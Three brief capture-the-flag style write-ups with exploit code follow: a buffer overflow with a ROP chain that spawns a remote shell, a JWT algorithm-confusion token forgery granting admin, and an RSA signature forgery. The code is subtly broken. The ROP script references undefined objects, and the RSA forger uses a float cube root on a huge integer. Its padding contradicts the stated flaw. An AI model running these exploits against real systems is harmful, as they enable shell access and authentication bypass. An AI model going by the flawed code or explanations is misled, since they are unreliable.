Buffer Overflow in Simple Service - Detailed Writeup

Challenge Description

We're given a 32-bit ELF binary running on a remote server that implements a simple network service. The service reads user input into a fixed-size buffer without proper bounds checking.

Initial Analysis

$ file vuln_service
vuln_service: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, 
interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=..., not stripped

$ checksec --file=vuln_service
[*] '/home/user/vuln_service'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled

Vulnerability Discovery

Using Ghidra, we decompile the main function:

void handle_connection(int sockfd) {
    char buffer[128];
    recv(sockfd, buffer, 1024, 0); // Buffer overflow here
    // ...
}

Exploit Development

We need to:

  1. Find the offset to EIP (140 bytes)
  2. Leak libc address to bypass ASLR
  3. Build ROP chain for system("/bin/sh")

Final Exploit

from pwn import *

context(arch='i386', os='linux')

# Connect to target
p = remote('ctf.example.com', 4444)

# Stage 1: Leak libc address
payload = b'A'*140
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])
p.send(payload)

# Parse leaked address
leak = u32(p.recv(4))
libc.address = leak - libc.sym['puts']

# Stage 2: ROP to system
payload = b'A'*140
payload += p32(libc.sym['system'])
payload += b'BBBB'  # fake ret
payload += p32(next(libc.search(b'/bin/sh')))
p.send(payload)

p.interactive()

JWT Authentication Bypass - Detailed Writeup

Challenge Description

The web application uses JWT for authentication. Our goal is to modify our privileges to gain admin access.

Initial Analysis

Inspecting the JWT token in the browser:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTY4MzQ1NjAwMH0.8Qh5l5sP-sG2o-3mYpN3w7v6Z1XKj7V0L2yB6nW3d4E

Vulnerability Discovery

The server is vulnerable to algorithm confusion (switching from RS256 to HS256).

Exploit Steps

  1. Get the public key from /static/public.key
  2. Change the algorithm to HS256
  3. Sign the token with the public key
  4. Modify the role to "admin"

Final Exploit

import jwt

# Get public key from server
public_key = open('public.key', 'r').read()

# Create malicious token
malicious_token = jwt.encode(
    {
        "username": "user",
        "role": "admin",
        "iat": 1683456000
    },
    public_key,
    algorithm="HS256"
)

print(malicious_token)

RSA Signature Forgery - Detailed Writeup

Challenge Description

The server implements an RSA signature verification system with improper padding checks, allowing signature forgery.

Initial Analysis

The server uses PKCS#1 v1.5 padding but doesn't properly verify the padding structure.

Vulnerability Discovery

By crafting a signature that contains the ASN.1 hash identifier but with incorrect padding, we can bypass verification.

Exploit Development

We use the Bleichenbacher's attack to create a signature that will be accepted by the flawed verifier.

Final Exploit

from Crypto.Util.number import bytes_to_long, long_to_bytes
import hashlib

def forge_signature(message):
    # ASN.1 SHA256 prefix
    asn1_sha256 = b'\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20'
    
    # Hash the message
    m_hash = hashlib.sha256(message).digest()
    
    # Construct forged padding
    # The server doesn't check the padding bytes between the prefix and the hash
    forged_padding = b'\x00\x01' + b'\xff' * 200 + b'\x00' + asn1_sha256 + m_hash
    
    # Convert to integer
    forged_sig = bytes_to_long(forged_padding)
    
    # Take cube root to get signature
    forged_sig = int(forged_sig ** (1/3)) + 1
    
    return long_to_bytes(forged_sig)

# Usage
message = b"admin=True"
fake_sig = forge_signature(message)
print(fake_sig.hex())
